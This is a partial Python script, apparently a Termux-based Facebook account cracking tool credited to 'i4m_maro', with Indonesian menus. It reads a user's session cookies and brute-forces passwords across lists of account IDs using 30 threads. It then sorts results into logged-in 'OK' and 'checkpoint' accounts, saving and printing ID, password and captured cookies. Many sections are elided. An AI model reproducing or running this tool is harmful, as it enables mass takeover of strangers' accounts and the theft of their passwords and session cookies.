...
\t𝐓𝐨𝐨𝐥𝐬         •  𝐓𝐞𝐫𝐦𝐮𝐱    🔥💻
\t𝐦𝐚𝐫𝐨           •  𝐒𝐡𝐞𝐱𝐳𝐚𝐝𝐚🔥💻
                       {m}•{k}•{h}•{sir}•{b} Author : i4m_maro {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©© 1778: [green]Cookiedough/BoostFacebook[white] ©©©'))
		asu = random.choice([m,k,h,b,u])
		cookie=input(f'  [{h}•{x}] Cookies dane :{asu} ')
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[•] 1. MARO {h}OK{x} Anda ')
	print(f'[•] 2. MARO {k}CP{x} Anda ')
	print('[•] 3. Kembali	')
	kz = input(f'\n>> Pilih : ')
	if kz in ['2']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki MARO CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
...
def setting():
	...
	print(f'{x}{p}[•] 1. Crack kon ')
	print(f'{b}[•] 2. Crack New ')
...
def passwrd():
	...
	print('')
	print(f'[•] maro {h}OK{x} Tersimpan Di : {h}OK/%s {x}'%(okc))
	print(f'[•] maro {k}CP{x} Tersimpan Di : {k}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]✓[green] CRACK Fb by stand —> maro 😎[cyan] ✓[white] '))
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}MARO CP —>{k} {idf}|{pw}{N}')     
				...
				if 'no' in taplikasi:
					...
					print(f'\r{x}MARO OK —> {H}{idf}|{pw}|{kuki}{N}')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				print(f'\r{x}MARO OK —> {H}{idf}|{pw}|{kuki}\n{ua}\n{infoakun}{x}')
